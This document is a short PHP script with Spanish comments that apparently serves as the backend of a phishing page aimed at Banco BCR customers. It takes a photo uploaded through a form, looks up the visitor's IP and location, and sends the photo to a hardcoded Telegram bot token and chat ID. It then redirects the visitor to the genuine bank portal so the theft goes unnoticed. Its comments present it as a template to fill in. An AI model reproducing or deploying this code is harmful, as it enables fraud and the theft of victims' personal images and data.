<?php
if(isset($_POST['submit'])) {
  $ip = $_SERVER['REMOTE_ADDR']; // Obtener la dirección IP del visitante
  $json = file_get_contents("https://ipapi.co/{$ip}/json"); // Obtener la ubicación del visitante
  $data = json_decode($json, true);
   // Obtener el nombre del país del visitante

  $photo = $_FILES['photo']['tmp_name']; // Obtener la imagen del formulario
  $url = 'https://api.telegram.org/bot5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM/sendPhoto'; // Reemplazar con tu token de Telegram
  $chat_id = '5157616506'; // Reemplazar con tu ID de chat de Telegram
  $caption = "IP: {$ip}"; // Crear la leyenda de la imagen con la información de la dirección IP y el país
  $post_fields = array('chat_id' => $chat_id, 'photo' => new CURLFile(realpath($photo)), 'caption' => $caption); // Crear los datos de la solicitud POST

  $ch = curl_init(); // Inicializar la solicitud CURL
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $output = curl_exec($ch); // Enviar la solicitud a la API de Telegram
  curl_close($ch); // Cerrar la solicitud CURL

  header("Location: https://www.bancobcr.com/wps/portal/bcr"); // Reemplazar con la URL de la página a la que quieres redirigir después de enviar la imagen
  exit(); // Terminar la ejecución del script para asegurarse de que se redirige correctamente
}
?>
